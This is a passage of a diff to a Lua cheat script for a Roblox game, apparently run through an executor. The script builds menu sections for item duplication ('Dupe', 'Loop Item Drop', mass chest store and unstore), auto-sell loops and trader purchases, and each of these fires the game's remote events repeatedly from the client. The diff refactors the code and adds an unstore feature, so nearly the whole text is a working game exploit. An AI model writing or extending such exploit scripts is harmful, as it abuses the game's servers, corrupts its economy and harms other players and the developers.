             if string.find(item.Name:lower(), args:lower()) then
                 ItemIndexed = item
-                return MakeAtlasNotification('Item Selected:', item.Name, 3)
+                return MakeNotification("Item Selected:", item.Name, 3)
             else
                 ItemIndexed = nil
                 ItemIndexedNumber = nil
             end
         end
-        return MakeAtlasNotification('Invalid Item', 'Item not found', 3)
+        return MakeNotification("Invalid Item", "Item not found", 3)
     end
 })
 
 RealDupeSection:CreateToggle({
-    Name = 'Loop Item Drop',
+    Name = "Loop Item Drop",
     Default = false,
-    Flag = 'LoopDropItem',
-    Callback  = function(Value)
+    Flag = "LoopDropItem",
+    Callback = function(Value)
         getgenv().configs.AmountToLoopDrop = Value
         if getgenv().configs.AmountToLoopDrop == true then
-            if ItemIndexed and ItemIndexed:FindFirstChild('Top'):FindFirstChild('NameLabel') then
-                ItemIndexedNumber = ItemIndexed:FindFirstChild('Top'):FindFirstChild('NameLabel').Text:match('%d+')
+            if ItemIndexed and ItemIndexed:FindFirstChild("Top"):FindFirstChild("NameLabel") then
+                ItemIndexedNumber = ItemIndexed:FindFirstChild("Top"):FindFirstChild("NameLabel").Text:match("%d+")
                 repeat task.wait()
                     if IsPlayerAlive(LocalPlayer) then
                         if ItemIndexed.Parent then
-                            if ItemIndexed:FindFirstChild('Top'):FindFirstChild('NameLabel').Text:match('%d+') == nil then
-                                RemoteEvents['InventoryInteraction']:FireServer(SWITCHEDITEMSTABLE[ItemIndexed.Name], 'Drop')
+                            if ItemIndexed:FindFirstChild("Top"):FindFirstChild("NameLabel").Text:match("%d+") == nil then
+                                RemoteEvents["InventoryInteraction"]:FireServer(SWITCHEDITEMSTABLE[ItemIndexed.Name], "Drop")
                             else
-                                ItemIndexedNumber = ItemIndexed:FindFirstChild('Top'):FindFirstChild('NameLabel').Text:match('%d+')
-                                RemoteEvents['InventoryInteraction']:FireServer(SWITCHEDITEMSTABLE[ItemIndexed.Name], 'Drop')
+                                ItemIndexedNumber = ItemIndexed:FindFirstChild("Top"):FindFirstChild("NameLabel").Text:match("%d+")
+                                RemoteEvents["InventoryInteraction"]:FireServer(SWITCHEDITEMSTABLE[ItemIndexed.Name], "Drop")
                             end
                         end
                     end
@@ -3655,46 +3329,45 @@ RealDupeSection:CreateToggle({
             end
         end
         if Value then
-            MakeAtlasNotification('Loop Drop', 'Loop Drop has been enabled', 2)
+            MakeNotification("Loop Drop", "Loop Drop has been enabled", 2)
         else
-            MakeAtlasNotification('Loop Drop', 'Loop Drop has been disabled', 2)
+            MakeNotification("Loop Drop", "Loop Drop has been disabled", 2)
         end
     end
 })
 
--- PLACE ANYTHING IN CHEST MOVED HERE
-local AnythingInChestSection = Dupe:CreateSection('Place Anything in nearest chest')
+local AnythingInChestSection = Dupe:CreateSection("Place Anything in nearest chest")
 
 AnythingInChestSection:CreateDropdown({
-    Name = 'Specific Chest Type',
-    DefaultItemSelected = 'Any',
-    Options = {'Any', 'Wood', 'Stone', 'Silver', 'Gold', 'Ruby', 'Diamond', 'Zenyte', 'Obsidian', 'Moonstone'},
+    Name = "Specific Chest Type",
+    DefaultItemSelected = "Any",
+    Options = {"Any", "Wood", "Stone", "Silver", "Gold", "Ruby", "Diamond", "Zenyte", "Obsidian", "Moonstone"},
     ItemSelecting = true,
     Callback = function(Value)
-        getgenv().configs.ChestType = Value 
-        MakeAtlasNotification('Chest Type', 'Set to: ' .. Value, 2)
+        getgenv().configs.ChestType = Value
+        MakeNotification("Chest Type", "Set to: " .. Value, 2)
     end
 })
 
 AnythingInChestSection:CreateButton({
-    Name = 'Store Item',
+    Name = "Store Item",
     Callback = function()
         local function GetClosestFilteredChest()
-            local CheckPassiveOrNonPassive = Workspace:FindFirstChild("Replicators"):FindFirstChild('NonPassive') and 'NonPassive' or 'Passive'
+            local CheckPassiveOrNonPassive = Workspace:FindFirstChild("Replicators"):FindFirstChild("NonPassive") and "NonPassive" or "Passive"
             local closest
             local range = math.huge
             if IsPlayerAlive(LocalPlayer) then
                 for _, chest in pairs(Workspace:WaitForChild("Replicators")[CheckPassiveOrNonPassive]:GetChildren()) do
-                    if string.find(chest.Name:lower(), 'storage') and chest:FindFirstChildOfClass('MeshPart') then
-                        if getgenv().configs.ChestType == 'Any' then
-                            local dist = (LocalPlayer.Character:WaitForChild('HumanoidRootPart').Position - chest:FindFirstChildOfClass('MeshPart').Position).magnitude
+                    if string.find(chest.Name:lower(), "storage") and chest:FindFirstChildOfClass("MeshPart") then
+                        if getgenv().configs.ChestType == "Any" then
+                            local dist = (LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position - chest:FindFirstChildOfClass("MeshPart").Position).magnitude
                             if dist < range then
                                 range = dist
                                 closest = chest
                             end
                         else
                             if string.find(chest.Name:lower(), getgenv().configs.ChestType:lower()) then
-                                local dist = (LocalPlayer.Character:WaitForChild('HumanoidRootPart').Position - chest:FindFirstChildOfClass('MeshPart').Position).magnitude
+                                local dist = (LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position - chest:FindFirstChildOfClass("MeshPart").Position).magnitude
                                 if dist < range then
                                     range = dist
                                     closest = chest
@@ -3708,44 +3381,41 @@ AnythingInChestSection:CreateButton({
         end
         local GetFilteredChest = GetClosestFilteredChest()
         if not GetFilteredChest then
-            MakeAtlasNotification('Needs chest', 'Place any chest down!', 2.5)
+            MakeNotification("Needs chest", "Place any chest down!", 2.5)
             return
         end
         for i=1, getgenv().AmountOfChestInserts do
-            RemoteEvents['UpdateStorageChest']:FireServer(GetFilteredChest, true, SWITCHEDITEMSTABLE[getgenv().ItemToPutInChest])
+            RemoteEvents["UpdateStorageChest"]:FireServer(GetFilteredChest, true, SWITCHEDITEMSTABLE[getgenv().ItemToPutInChest])
         end
-        MakeAtlasNotification('Item Stored', 'Item has been stored in chest', 2)
+        MakeNotification("Item Stored", "Item has been stored in chest", 2)
     end
 })
 
 getgenv().ChestItems = AnythingInChestSection:CreateDropdown({
-    Name = 'Inventory Item',
-    DefaultItemSelected = '...',
-    Options = {'...'},
+    Name = "Inventory Item",
+    DefaultItemSelected = "...",
+    Options = {"..."},
     ItemSelecting = true,
     Callback = function(Value)
-        getgenv().ItemToPutInChest = Value 
-        MakeAtlasNotification('Item Selected', 'Selected: ' .. Value, 2)
+        getgenv().ItemToPutInChest = Value
+        MakeNotification("Item Selected", "Selected: " .. Value, 2)
     end
 })
 
-local ItemsToPutInChest = {};
-
+local ItemsToPutInChest = {}
 for _, inv in pairs(MyInventory:GetChildren()) do
-    if inv:IsA("ImageLabel") and inv.Name ~= 'Arrow' then
+    if inv:IsA("ImageLabel") and inv.Name ~= "Arrow" then
         table.insert(ItemsToPutInChest, inv.Name)
     end
 end
-
 table.sort(ItemsToPutInChest)
-
 getgenv().ChestItems:Update(ItemsToPutInChest)
 
 if not getgenv().InventoryCollecting then
     getgenv().InventoryCollecting = MyInventory.ChildAdded:Connect(function(item)
         ItemsToPutInChest = {}
         for _, inv in pairs(MyInventory:GetChildren()) do
-            if inv:IsA("ImageLabel") and inv.Name ~= 'Arrow' then
+            if inv:IsA("ImageLabel") and inv.Name ~= "Arrow" then
                 table.insert(ItemsToPutInChest, inv.Name)
             end
         end
@@ -3755,65 +3425,159 @@ if not getgenv().InventoryCollecting then
 end
 
 AnythingInChestSection:CreateSlider({
-    Name = 'Amount of item',
+    Name = "Amount of item",
     Min = 1,
     Max = 200,
     Default = 1,
     Digits = 0,
-    Flag = 'AmountChestItem',
+    Flag = "AmountChestItem",
     Callback = function(Value)
         getgenv().AmountOfChestInserts = Value
-        MakeAtlasNotification('Amount', 'Set to: ' .. tostring(Value), 2)
-    end 
+        MakeNotification("Amount", "Set to: " .. tostring(Value), 2)
+    end
+})
+
+local UnstoreSection = Dupe:CreateSection("Unstore Item from chest")
+
+UnstoreSection:CreateButton({
+    Name = "Unstore Item",
+    Callback = function()
+        local function GetClosestFilteredChest()
+            local CheckPassiveOrNonPassive = Workspace:FindFirstChild("Replicators"):FindFirstChild("NonPassive") and "NonPassive" or "Passive"
+            local closest
+            local range = math.huge
+            if IsPlayerAlive(LocalPlayer) then
+                for _, chest in pairs(Workspace:WaitForChild("Replicators")[CheckPassiveOrNonPassive]:GetChildren()) do
+                    if string.find(chest.Name:lower(), "storage") and chest:FindFirstChildOfClass("MeshPart") then
+                        if getgenv().configs.ChestType == "Any" then
+                            local dist = (LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position - chest:FindFirstChildOfClass("MeshPart").Position).magnitude
+                            if dist < range then
+                                range = dist
+                                closest = chest
+                            end
+                        else
+                            if string.find(chest.Name:lower(), getgenv().configs.ChestType:lower()) then
+                                local dist = (LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position - chest:FindFirstChildOfClass("MeshPart").Position).magnitude
+                                if dist < range then
+                                    range = dist
+                                    closest = chest
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+            return closest
+        end
+        local GetFilteredChest = GetClosestFilteredChest()
+        if not GetFilteredChest then
+            MakeNotification("Needs chest", "Place any chest down!", 2.5)
+            return
+        end
+        if not getgenv().ItemToUnstore then
+            MakeNotification("No item selected", "Select an item to unstore first!", 2.5)
+            return
+        end
+        for i=1, getgenv().AmountOfChestInserts do
+            RemoteEvents["UpdateStorageChest"]:FireServer(GetFilteredChest, false, SWITCHEDITEMSTABLE[getgenv().ItemToUnstore])
+        end
+        MakeNotification("Item Unstored", "Item has been taken out of chest", 2)
+    end
+})
+
+getgenv().UnstoreItems = UnstoreSection:CreateDropdown({
+    Name = "Item to Unstore",
+    DefaultItemSelected = "...",
+    Options = {"..."},
+    ItemSelecting = true,
+    Callback = function(Value)
+        getgenv().ItemToUnstore = Value
+        MakeNotification("Item Selected", "Selected: " .. Value, 2)
+    end
+})
+
+local UnstoreItemsList = {}
+for _, inv in pairs(MyInventory:GetChildren()) do
+    if inv:IsA("ImageLabel") and inv.Name ~= "Arrow" then
+        table.insert(UnstoreItemsList, inv.Name)
+    end
+end
+table.sort(UnstoreItemsList)
+getgenv().UnstoreItems:Update(UnstoreItemsList)
+
+if not getgenv().UnstoreCollecting then
+    getgenv().UnstoreCollecting = MyInventory.ChildAdded:Connect(function(item)
+        UnstoreItemsList = {}
+        for _, inv in pairs(MyInventory:GetChildren()) do
+            if inv:IsA("ImageLabel") and inv.Name ~= "Arrow" then
+                table.insert(UnstoreItemsList, inv.Name)
+            end
+        end
+        table.sort(UnstoreItemsList)
+        getgenv().UnstoreItems:Update(UnstoreItemsList)
+    end)
+end
+
+UnstoreSection:CreateSlider({
+    Name = "Amount to unstore",
+    Min = 1,
+    Max = 200,
+    Default = 1,
+    Digits = 0,
+    Flag = "AmountUnstoreItem",
+    Callback = function(Value)
+        getgenv().AmountOfChestInserts = Value
+        MakeNotification("Amount", "Set to: " .. tostring(Value), 2)
+    end
 })
 
 -- ============================================================
 --  AUTOSELL TAB
 -- ============================================================
-local AutoSellSection = AutoSell:CreateSection('AutoSell (This does not account for pet token multipliers)')
+local AutoSellSection = AutoSell:CreateSection("AutoSell (This does not account for pet token multipliers)")
 
 AutoSellSection:CreateToggle({
-    Name = '4 Silver Bar = 1 Token',
+    Name = "4 Silver Bar = 1 Token",
     Default = false,
-    Flag = 'SellSilverBar',
+    Flag = "SellSilverBar",
     Callback = function(Value)
         _G.SellSilver = Value
         while _G.SellSilver and task.wait(0.5) do
             if _G.SellSilver then
-                SellItem('Silver Bar', 4, 14)
+                SellItem("Silver Bar", 4, 14)
             end
         end
         if Value then
-            MakeAtlasNotification('AutoSell Silver', 'AutoSell Silver has been enabled', 2)
+            MakeNotification("AutoSell Silver", "AutoSell Silver has been enabled", 2)
         else
-            MakeAtlasNotification('AutoSell Silver', 'AutoSell Silver has been disabled', 2)
+            MakeNotification("AutoSell Silver", "AutoSell Silver has been disabled", 2)
         end
     end
 })
 
 AutoSellSection:CreateToggle({
-    Name = '4 Slime Ball = 1 Token',
+    Name = "4 Slime Ball = 1 Token",
     Default = false,
-    Flag = 'SellSlimeBall',
+    Flag = "SellSlimeBall",
     Callback = function(Value)
         _G.SellSlime = Value
         while _G.SellSlime and task.wait(0.5) do
             if _G.SellSlime then
-                SellItem('Slime Ball', 40, 15)
+                SellItem("Slime Ball", 40, 15)
             end
         end
         if Value then
-            MakeAtlasNotification('AutoSell Slime', 'AutoSell Slime has been enabled', 2)
+            MakeNotification("AutoSell Slime", "AutoSell Slime has been enabled", 2)
         else
-            MakeAtlasNotification('AutoSell Slime', 'AutoSell Slime has been disabled', 2)
+            MakeNotification("AutoSell Slime", "AutoSell Slime has been disabled", 2)
         end
     end
 })
 
 AutoSellSection:CreateToggle({
-    Name = '2 Gold Bar = 1 Token',
+    Name = "2 Gold Bar = 1 Token",
     Default = false,
-    Flag = 'SellGoldBar',
+    Flag = "SellGoldBar",
     Callback = function(Value)
         _G.SellGold = Value
         while _G.SellSlime and task.wait(0.5) do
@@ -3822,17 +3586,17 @@ AutoSellSection:CreateToggle({
             end
         end
         if Value then
-            MakeAtlasNotification('AutoSell Gold', 'AutoSell Gold has been enabled', 2)
+            MakeNotification("AutoSell Gold", "AutoSell Gold has been enabled", 2)
         else
-            MakeAtlasNotification('AutoSell Gold', 'AutoSell Gold has been disabled', 2)
+            MakeNotification("AutoSell Gold", "AutoSell Gold has been disabled", 2)
         end
     end
 })
 
 AutoSellSection:CreateToggle({
-    Name = '1 Ruby = 3 Token',
+    Name = "1 Ruby = 3 Token",
     Default = false,
-    Flag = 'SellRuby',
+    Flag = "SellRuby",
     Callback = function(Value)
         _G.SellRuby = Value
         while _G.SellRuby and task.wait(0.5) do
@@ -3841,17 +3605,17 @@ AutoSellSection:CreateToggle({
             end
         end
         if Value then
-            MakeAtlasNotification('AutoSell Ruby', 'AutoSell Ruby has been enabled', 2)
+            MakeNotification("AutoSell Ruby", "AutoSell Ruby has been enabled", 2)
         else
-            MakeAtlasNotification('AutoSell Ruby', 'AutoSell Ruby has been disabled', 2)
+            MakeNotification("AutoSell Ruby", "AutoSell Ruby has been disabled", 2)
         end
     end
 })
 
 AutoSellSection:CreateToggle({
-    Name = '1 Diamond = 4 Token',
+    Name = "1 Diamond = 4 Token",
     Default = false,
-    Flag = 'SellDiamond',
+    Flag = "SellDiamond",
     Callback = function(Value)
         _G.SellDiamonds = Value
         while _G.SellDiamonds and task.wait(0.5) do
@@ -3860,17 +3624,17 @@ AutoSellSection:CreateToggle({
             end
         end
         if Value then
-            MakeAtlasNotification('AutoSell Diamond', 'AutoSell Diamond has been enabled', 2)
+            MakeNotification("AutoSell Diamond", "AutoSell Diamond has been enabled", 2)
         else
-            MakeAtlasNotification('AutoSell Diamond', 'AutoSell Diamond has been disabled', 2)
+            MakeNotification("AutoSell Diamond", "AutoSell Diamond has been disabled", 2)
         end
     end
 })
 
 AutoSellSection:CreateToggle({
-    Name = '1 Soul = 5 Token',
+    Name = "1 Soul = 5 Token",
     Default = false,
-    Flag = 'SellSoul',
+    Flag = "SellSoul",
     Callback = function(Value)
         _G.SellSouls = Value
         while _G.SellSouls and task.wait(0.5) do
@@ -3883,17 +3647,17 @@ AutoSellSection:CreateToggle({
             end
         end
         if Value then
-            MakeAtlasNotification('AutoSell Soul', 'AutoSell Soul has been enabled', 2)
+            MakeNotification("AutoSell Soul", "AutoSell Soul has been enabled", 2)
         else
-            MakeAtlasNotification('AutoSell Soul', 'AutoSell Soul has been disabled', 2)
+            MakeNotification("AutoSell Soul", "AutoSell Soul has been disabled", 2)
         end
     end
 })
 
 AutoSellSection:CreateToggle({
-    Name = '1 Zenyte = 6 Token',
+    Name = "1 Zenyte = 6 Token",
     Default = false,
-    Flag = 'SellZenyte',
+    Flag = "SellZenyte",
     Callback = function(Value)
         _G.SellZenyte = Value
         while _G.SellZenyte and task.wait(0.5) do
@@ -3902,17 +3666,17 @@ AutoSellSection:CreateToggle({
             end
         end
         if Value then
-            MakeAtlasNotification('AutoSell Zenyte', 'AutoSell Zenyte has been enabled', 2)
+            MakeNotification("AutoSell Zenyte", "AutoSell Zenyte has been enabled", 2)
         else
-            MakeAtlasNotification('AutoSell Zenyte', 'AutoSell Zenyte has been disabled', 2)
+            MakeNotification("AutoSell Zenyte", "AutoSell Zenyte has been disabled", 2)
         end
     end
 })
 
 AutoSellSection:CreateToggle({
-    Name = '1 Volcanic Ore = 15 Token',
+    Name = "1 Volcanic Ore = 15 Token",
     Default = false,
-    Flag = 'SellVolcanicOre',
+    Flag = "SellVolcanicOre",
     Callback = function(Value)
         _G.SellVolcanicOre = Value
         while _G.SellVolcanicOre and task.wait(0.5) do
@@ -3921,17 +3685,17 @@ AutoSellSection:CreateToggle({
             end
         end
         if Value then
-            MakeAtlasNotification('AutoSell Volcanic', 'AutoSell Volcanic has been enabled', 2)
+            MakeNotification("AutoSell Volcanic", "AutoSell Volcanic has been enabled", 2)
         else
-            MakeAtlasNotification('AutoSell Volcanic', 'AutoSell Volcanic has been disabled', 2)
+            MakeNotification("AutoSell Volcanic", "AutoSell Volcanic has been disabled", 2)
         end
     end
 })
 
 AutoSellSection:CreateToggle({
-    Name = '1 Obsidian = 20 Token',
+    Name = "1 Obsidian = 20 Token",
     Default = false,
-    Flag = 'SellObsidian',
+    Flag = "SellObsidian",
     Callback = function(Value)
         _G.SellObsidian = Value
         while _G.SellObsidian and task.wait(0.5) do
@@ -3940,17 +3704,17 @@ AutoSellSection:CreateToggle({
             end
         end
         if Value then
-            MakeAtlasNotification('AutoSell Obsidian', 'AutoSell Obsidian has been enabled', 2)
+            MakeNotification("AutoSell Obsidian", "AutoSell Obsidian has been enabled", 2)
         else
-            MakeAtlasNotification('AutoSell Obsidian', 'AutoSell Obsidian has been disabled', 2)
+            MakeNotification("AutoSell Obsidian", "AutoSell Obsidian has been disabled", 2)
         end
     end
 })
 
 AutoSellSection:CreateToggle({
-    Name = '1 Lunar Ore = 25 Token',
+    Name = "1 Lunar Ore = 25 Token",
     Default = false,
-    Flag = 'SellLunar',
+    Flag = "SellLunar",
     Callback = function(Value)
         _G.SellLunarOre = Value
         while _G.SellLunarOre and task.wait(0.5) do
@@ -3959,17 +3723,17 @@ AutoSellSection:CreateToggle({
             end
         end
         if Value then
-            MakeAtlasNotification('AutoSell Lunar', 'AutoSell Lunar has been enabled', 2)
+            MakeNotification("AutoSell Lunar", "AutoSell Lunar has been enabled", 2)
         else
-            MakeAtlasNotification('AutoSell Lunar', 'AutoSell Lunar has been disabled', 2)
+            MakeNotification("AutoSell Lunar", "AutoSell Lunar has been disabled", 2)
         end
     end
 })
 
 AutoSellSection:CreateToggle({
-    Name = '1 Moonstone = 30 Token',
+    Name = "1 Moonstone = 30 Token",
     Default = false,
-    Flag = 'SellMoonstone',
+    Flag = "SellMoonstone",
     Callback = function(Value)
         _G.SellMoonstone = Value
         while _G.SellMoonstone and task.wait(0.5) do
@@ -3978,296 +3742,75 @@ AutoSellSection:CreateToggle({
             end
         end
         if Value then
-            MakeAtlasNotification('AutoSell Moonstone', 'AutoSell Moonstone has been enabled', 2)
+            MakeNotification("AutoSell Moonstone", "AutoSell Moonstone has been enabled", 2)
         else
-            MakeAtlasNotification('AutoSell Moonstone', 'AutoSell Moonstone has been disabled', 2)
+            MakeNotification("AutoSell Moonstone", "AutoSell Moonstone has been disabled", 2)
         end
     end
 })
 
-local ArmorTraderSection = AutoSell:CreateSection('Armor Trader')
+local ArmorTraderSection = AutoSell:CreateSection("Armor Trader")
 
-ArmorTraderSection:CreateButton({
-    Name = 'Ruby Shield = 50 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 27)
-        MakeAtlasNotification('Trade', 'Ruby Shield has been traded', 2)
-    end
-})
+local armorItems = {
+    {"Ruby Shield = 50 Token", 27},
+    {"Diamond Shield = 100 Token", 28},
+    {"Zenyte Shield = 150 Token", 29},
+    {"Obsidian Shield = 350 Token", 30},
+    {"Ruby Helmet = 15 Token", 31},
+    {"Ruby Body = 15 Token", 32},
+    {"Ruby Legs = 15 Token", 33},
+    {"Ruby Boots = 15 Token", 34},
+    {"Diamond Helmet = 27 Token", 35},
+    {"Diamond Body = 27 Token", 36},
+    {"Diamond Legs = 27 Token", 37},
+    {"Diamond Boots = 27 Token", 38},
+    {"Zenyte Helmet = 45 Token", 39},
+    {"Zenyte Body = 45 Token", 40},
+    {"Zenyte Legs = 45 Token", 41},
+    {"Zenyte Boots = 45 Token", 42},
+    {"Obsidian Helmet = 115 Token", 43},
+    {"Obsidian Body = 115 Token", 44},
+    {"Obsidian Legs = 115 Token", 45},
+    {"Obsidian Boots = 115 Token", 46},
+    {"Moonstone Helmet = 175 Token", 47},
+    {"Moonstone Body = 175 Token", 48},
+    {"Moonstone Legs = 175 Token", 49},
+    {"Moonstone Boots = 175 Token", 50},
+    {"Springy Boots", 51},
+}
+for _, item in ipairs(armorItems) do
+    ArmorTraderSection:CreateButton({
+        Name = item[1],
+        Callback = function()
+            RemoteEvents["TradeTrader"]:FireServer("Armour Trader", item[2])
+            MakeNotification("Trade", item[1] .. " has been traded", 2)
+        end
+    })
+end
 
-ArmorTraderSection:CreateButton({
-    Name = 'Diamond Shield = 100 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 28)
-        MakeAtlasNotification('Trade', 'Diamond Shield has been traded', 2)
-    end
-})
+local WeaponTraderSection = AutoSell:CreateSection("Weapon Trader")
 
-ArmorTraderSection:CreateButton({
-    Name = 'Zenyte Shield = 150 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 29)
-        MakeAtlasNotification('Trade', 'Zenyte Shield has been traded', 2)
-    end
-})
-
-ArmorTraderSection:CreateButton({
-    Name = 'Obsidian Shield = 350 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 30)
-        MakeAtlasNotification('Trade', 'Obsidian Shield has been traded', 2)
-    end
-})
-
-ArmorTraderSection:CreateButton({
-    Name = 'Ruby Helmet = 15 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 31)
-        MakeAtlasNotification('Trade', 'Ruby Helmet has been traded', 2)
-    end
-})
-
-ArmorTraderSection:CreateButton({
-    Name = 'Ruby Body = 15 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 32)
-        MakeAtlasNotification('Trade', 'Ruby Body has been traded', 2)
-    end
-})
-
-ArmorTraderSection:CreateButton({
-    Name = 'Ruby Legs = 15 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 33)
-        MakeAtlasNotification('Trade', 'Ruby Legs has been traded', 2)
-    end
-})
-
-ArmorTraderSection:CreateButton({
-    Name = 'Ruby Boots = 15 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 34)
-        MakeAtlasNotification('Trade', 'Ruby Boots has been traded', 2)
-    end
-})
-
-ArmorTraderSection:CreateButton({
-    Name = 'Diamond Helmet = 27 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 35)
-        MakeAtlasNotification('Trade', 'Diamond Helmet has been traded', 2)
-    end
-})
-
-ArmorTraderSection:CreateButton({
-    Name = 'Diamond Body = 27 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 36)
-        MakeAtlasNotification('Trade', 'Diamond Body has been traded', 2)
-    end
-})
-
-ArmorTraderSection:CreateButton({
-    Name = 'Diamond Legs = 27 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 37)
-        MakeAtlasNotification('Trade', 'Diamond Legs has been traded', 2)
-    end
-})
-
-ArmorTraderSection:CreateButton({
-    Name = 'Diamond Boots = 27 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 38)
-        MakeAtlasNotification('Trade', 'Diamond Boots has been traded', 2)
-    end
-})
-
-ArmorTraderSection:CreateButton({
-    Name = 'Zenyte Helmet = 45 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 39)
-        MakeAtlasNotification('Trade', 'Zenyte Helmet has been traded', 2)
-    end
-})
-
-ArmorTraderSection:CreateButton({
-    Name = 'Zenyte Body = 45 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 40)
-        MakeAtlasNotification('Trade', 'Zenyte Body has been traded', 2)
-    end
-})
-
-ArmorTraderSection:CreateButton({
-    Name = 'Zenyte Legs = 45 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 41)
-        MakeAtlasNotification('Trade', 'Zenyte Legs has been traded', 2)
-    end
-})
-
-ArmorTraderSection:CreateButton({
-    Name = 'Zenyte Boots = 45 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 42)
-        MakeAtlasNotification('Trade', 'Zenyte Boots has been traded', 2)
-    end
-})
-
-ArmorTraderSection:CreateButton({
-    Name = 'Obsidian Helmet = 115 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 43)
-        MakeAtlasNotification('Trade', 'Obsidian Helmet has been traded', 2)
-    end
-})
-
-ArmorTraderSection:CreateButton({
-    Name = 'Obsidian Body = 115 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 44)
-        MakeAtlasNotification('Trade', 'Obsidian Body has been traded', 2)
-    end
-})
-
-ArmorTraderSection:CreateButton({
-    Name = 'Obsidian Legs = 115 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 45)
-        MakeAtlasNotification('Trade', 'Obsidian Legs has been traded', 2)
-    end
-})
-
-ArmorTraderSection:CreateButton({
-    Name = 'Obsidian Boots = 115 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 46)
-        MakeAtlasNotification('Trade', 'Obsidian Boots has been traded', 2)
-    end
-})
-
-ArmorTraderSection:CreateButton({
-    Name = 'Moostone Helmet = 175 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 47)
-        MakeAtlasNotification('Trade', 'Moonstone Helmet has been traded', 2)
-    end
-})
-
-ArmorTraderSection:CreateButton({
-    Name = 'Moostone Body = 175 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 48)
-        MakeAtlasNotification('Trade', 'Moonstone Body has been traded', 2)
-    end
-})
-
-ArmorTraderSection:CreateButton({
-    Name = 'Moostone Legs = 175 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 49)
-        MakeAtlasNotification('Trade', 'Moonstone Legs has been traded', 2)
-    end
-})
-
-ArmorTraderSection:CreateButton({
-    Name = 'Moostone Boots = 175 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 50)
-        MakeAtlasNotification('Trade', 'Moonstone Boots has been traded', 2)
-    end
-})
-
-ArmorTraderSection:CreateButton({
-    Name = 'Springy Boots',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 51)
-        MakeAtlasNotification('Trade', 'Springy Boots has been traded', 2)
-    end
-})
-
-local WeaponTraderSection = AutoSell:CreateSection('Weapon Trader')
-
-WeaponTraderSection:CreateButton({
-    Name = 'Silver Sword = 1 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 11)
-        MakeAtlasNotification('Trade', 'Silver Sword has been traded', 2)
-    end
-})
-
-WeaponTraderSection:CreateButton({
-    Name = 'Gold Sword = 2 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 12)
-        MakeAtlasNotification('Trade', 'Gold Sword has been traded', 2)
-    end
-})
-
-WeaponTraderSection:CreateButton({
-    Name = 'Gold Bow = 3 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 13)
-        MakeAtlasNotification('Trade', 'Gold Bow has been traded', 2)
-    end
-})
-
-WeaponTraderSection:CreateButton({
-    Name = 'Ruby Sword = 10 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 14)
-        MakeAtlasNotification('Trade', 'Ruby Sword has been traded', 2)
-    end
-})
-
-WeaponTraderSection:CreateButton({
-    Name = 'Diamond Sword = 18 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 15)
-        MakeAtlasNotification('Trade', 'Diamond Sword has been traded', 2)
-    end
-})
-
-WeaponTraderSection:CreateButton({
-    Name = 'Zenyte Sword = 30 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 17)
-        MakeAtlasNotification('Trade', 'Zenyte Sword has been traded', 2)
-    end
-})
-
-WeaponTraderSection:CreateButton({
-    Name = 'Diamond Crossbow = 36 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 16)
-        MakeAtlasNotification('Trade', 'Diamond Crossbow has been traded', 2)
-    end
-})
-
-WeaponTraderSection:CreateButton({
-    Name = 'Zenyte Crossbow = 45 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 18)
-        MakeAtlasNotification('Trade', 'Zenyte Crossbow has been traded', 2)
-    end
-})
-
-WeaponTraderSection:CreateButton({
-    Name = 'Obsidian Club = 80 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 19)
-        MakeAtlasNotification('Trade', 'Obsidian Club has been traded', 2)
-    end
-})
-
-WeaponTraderSection:CreateButton({
-    Name = 'Moonstone Sword = 130 Token',
-    Callback = function()
-        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 20)
-        MakeAtlasNotification('Trade', 'Moonstone Sword has been traded', 2)
-    end
